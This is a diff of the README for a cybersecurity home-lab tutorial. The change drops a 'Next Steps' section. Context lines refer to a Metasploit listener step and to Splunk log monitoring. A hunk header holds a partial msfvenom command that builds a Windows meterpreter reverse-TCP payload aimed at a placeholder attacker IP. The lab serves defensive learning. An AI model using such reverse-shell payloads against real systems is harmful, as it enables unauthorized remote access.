@@ -19,8 +19,7 @@
 8.  [Step 5: Setting Up a Metasploit Listener](#step-5-setting-up-a-metasploit-listener)
 9.  [Step 6: Monitoring Logs with Splunk](#step-6-monitoring-logs-with-splunk)
 10. [Troubleshooting](#troubleshooting)
-11. [Next Steps & Future Improvements](#next-steps--future-improvements)
-12. [Conclusion](#conclusion)
+11. [Conclusion](#conclusion)
 
 ---
 ## 📌Introduction
@@ -228,12 +227,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -
 - Restart Splunk and recheck the event index.
 
 ---
-## 🎯Next Steps & Future Improvements
-- Integrate **ELK Stack** for enhanced log analysis.
-- Automate attack execution using **Python scripts**.
-- Implement **Wazuh SIEM** for better threat detection.
 
----
 ## Conclusion
 This project demonstrates how to:
 - Set up a cybersecurity home lab
@@ -241,3 +235,4 @@ This project demonstrates how to:
 - Use Splunk for threat monitoring
 
 > **Note:** This is for educational purposes only. Do not use these techniques for unauthorized activities.
+---
